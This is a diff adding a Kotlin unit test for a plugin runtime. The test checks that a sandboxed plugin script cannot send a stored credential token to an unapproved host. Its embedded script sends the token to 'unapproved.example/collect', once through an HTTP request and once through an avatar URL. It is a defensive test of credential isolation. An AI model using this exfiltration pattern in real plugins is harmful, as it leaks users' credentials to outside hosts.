@@ -57,6 +57,63 @@ class PluginRuntimePoolTest {
     }
 
     @Test
+    fun deniedHttpOriginCannotReceiveCredentialsThroughAnAvatar() =
+        runBlocking<Unit> {
+            val script =
+                pageScript(
+                    """async function(request, context) {
+              const token = (await flare.credential.read()).token;
+              let blocked = false;
+              try { await flare.http.request({ url: "https://unapproved.example/collect?token=" + token }); }
+              catch (_) { blocked = true; }
+              return { blocked, profile: { key: { id: context.accountId, host: "one.example" }, handle: "me", displayName: "Me",
+                avatarUrl: "https://unapproved.example/collect?token=" + token } };
+            }""",
+                )
+            val plugin = install(script)
+            val transport = CapturingTransport()
+            val pool = PluginRuntimePool(fileSystem, transport)
+            try {
+                val context =
+                    accountContext(
+                        plugin,
+                        "first",
+                        "https://one.example",
+                        MemoryCredential(buildJsonObject { put("token", "dummy-token") }),
+                    )
+                val result = invokePage(pool, plugin, context, JsonObject(emptyMap()))
+                assertEquals("true", result.getValue("blocked").jsonPrimitive.content)
+                assertTrue(transport.urls.isEmpty())
+                val profile =
+                    dev.dimension.flare.feature.plugin.abi.PluginJsonV1.decodeFromJsonElement(
+                        dev.dimension.flare.feature.plugin.wire.ProfileV1
+                            .serializer(),
+                        result.getValue("profile"),
+                    )
+                val mapper =
+                    dev.dimension.flare.feature.plugin.adapter.PluginWireMapperV1(
+                        pluginId = PLUGIN_ID,
+                        platformId = PLATFORM_ID,
+                        accountKey =
+                            dev.dimension.flare.model
+                                .MicroBlogKey("first", "one.example"),
+                        originHost = "one.example",
+                        profileAvailable = true,
+                        postDetailAvailable = true,
+                        articleDetailAvailable = false,
+                        galleryDetailAvailable = false,
+                        postMutationAvailable = false,
+                        postDeleteAvailable = false,
+                        composeAvailable = false,
+                        mediaNetwork = plugin.installed.manifest.permissions.mediaNetwork,
+                    )
+                assertFailsWith<IllegalArgumentException> { mapper.profile(profile) }
+            } finally {
+                pool.close()
+            }
+        }
+
+    @Test
     fun accountContextsKeepCredentialsOriginsAndAssetsIsolated() =
         runBlocking {
             val plugin = install(pageScript(CONTEXT_PAGE))
